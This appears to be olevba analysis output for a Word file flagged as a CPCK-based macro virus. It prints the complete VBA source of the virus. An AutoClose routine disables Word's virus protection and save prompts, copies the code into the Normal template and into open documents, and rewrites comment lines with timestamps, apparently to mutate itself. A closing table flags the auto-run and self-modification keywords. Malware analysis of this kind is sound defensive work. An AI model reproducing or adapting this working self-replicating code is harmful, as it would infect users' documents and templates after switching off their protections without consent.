olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-dfe8030b0edc7d01da33f67b0069f2e5308ad524
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-dfe8030b0edc7d01da33f67b0069f2e5308ad524 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'14/04/2000 15.01.47
On Error Resume Next
'14/04/2000 15.01.47
Options.VirusProtection = 0
'14/04/2000 15.01.47
CT83 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'14/04/2000 15.01.47
Options.ConfirmConversions = 0
'14/04/2000 15.01.47
Options.SaveNormalPrompt = 0
'14/04/2000 15.01.47
QH45 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'14/04/2000 15.01.47
Application.EnableCancelKey = 0
'14/04/2000 15.01.47
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'14/04/2000 15.01.47
Set KR29 = ActiveDocument.VBProject.VBComponents.Item(1)
'14/04/2000 15.01.47
OT60 = True
'14/04/2000 15.01.47
End If
'14/04/2000 15.01.47
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'14/04/2000 15.01.47
Set KR29 = NormalTemplate.VBProject.VBComponents.Item(1)
'14/04/2000 15.01.47
MQ74 = True
'14/04/2000 15.01.47
End If
'14/04/2000 15.01.47
If MQ74 <> True And OT60 <> True Then GoTo OQ45
'14/04/2000 15.01.47
If MQ74 = True Then KR29.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CT83 - 1))
'14/04/2000 15.01.47
If OT60 = True Then KR29.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, QH45 - 1))
'14/04/2000 15.01.47
With KR29.CodeModule
'14/04/2000 15.01.48
For x = 2 To (KR29.CodeModule.CountOfLines - 1) Step 2
'14/04/2000 15.01.48
.replaceline x, "'" & Now
'14/04/2000 15.01.48
Next x
'14/04/2000 15.01.48
End With
'14/04/2000 15.01.48
OQ45:
'14/04/2000 15.01.48
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

